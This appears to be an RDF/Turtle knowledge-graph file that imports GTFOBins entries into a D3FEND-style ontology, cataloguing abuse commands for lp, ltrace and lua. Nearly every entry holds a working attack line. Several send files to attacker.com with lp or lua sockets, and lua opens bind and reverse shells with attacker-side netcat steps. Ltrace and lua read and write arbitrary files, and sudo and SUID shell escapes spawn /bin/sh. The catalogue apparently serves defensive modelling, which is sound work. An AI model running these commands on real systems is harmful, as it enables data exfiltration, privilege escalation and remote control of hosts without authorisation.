mknd:command_lp-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "lp-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """To collect the file run the following on the attacker box (this requires `cups` to be installed):

1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
2. `lpadmin -d printer` to set the new printer as default;
3. `cupsctl --remote-any` to enable printing from the Internet;
4. `nc -lkp 9100` to receive the file.

Send a local file to a CUPS server.
""" ;
    d3f:uses mknd:executable_lp ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_lp ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """LFILE=file_to_send
RHOST=attacker.com
lp $LFILE -h $RHOST
""" .

mknd:command_ltrace-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ltrace-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files." ;
    d3f:uses mknd:executable_ltrace ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ltrace ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
ltrace -F $LFILE /dev/null
""" .

mknd:command_ltrace-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ltrace-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`." ;
    d3f:uses mknd:executable_ltrace ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ltrace ;
    mknd:provides mknd:function_file-write ;
    mknd:value """LFILE=file_to_write
ltrace -s 999 -o $LFILE ltrace -F DATA
""" .

mknd:command_ltrace-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ltrace-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_ltrace ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ltrace ;
    mknd:provides mknd:function_shell ;
    mknd:value "ltrace -b -L /bin/sh" .

mknd:command_ltrace-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ltrace-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_ltrace ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ltrace ;
    mknd:provides mknd:function_sudo ;
    mknd:value "sudo ltrace -b -L /bin/sh" .

mknd:command_lua-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "lua-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires `lua-socket` installed." ;
    d3f:uses mknd:executable_lua ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_lua ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export LPORT=12345
export LFILE=file_to_save
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
""" .

mknd:command_lua-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "lua-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_lua ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_lua ;
    mknd:provides mknd:function_file-read ;
    mknd:value "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'" .

mknd:command_lua-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "lua-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires `lua-socket` installed." ;
    d3f:uses mknd:executable_lua ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_lua ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
lua -e '
  local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
""" .

mknd:command_lua-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "lua-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_lua ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_lua ;
    mknd:provides mknd:function_file-write ;
    mknd:value "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'" .

mknd:command_lua-limited-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "lua-limited-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_lua ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_lua ;
    mknd:provides mknd:function_limited-suid ;
    mknd:value "./lua -e 'os.execute(\"/bin/sh\")'" .

mknd:command_lua-non-interactive-bind-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "lua-non-interactive-bind-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed." ;
    d3f:uses mknd:executable_lua ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_lua ;
    mknd:provides mknd:function_non-interactive-bind-shell ;
    mknd:value """export LPORT=12345
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
""" .

mknd:command_lua-non-interactive-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "lua-non-interactive-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed." ;
    d3f:uses mknd:executable_lua ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_lua ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
lua -e 'local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
""" .

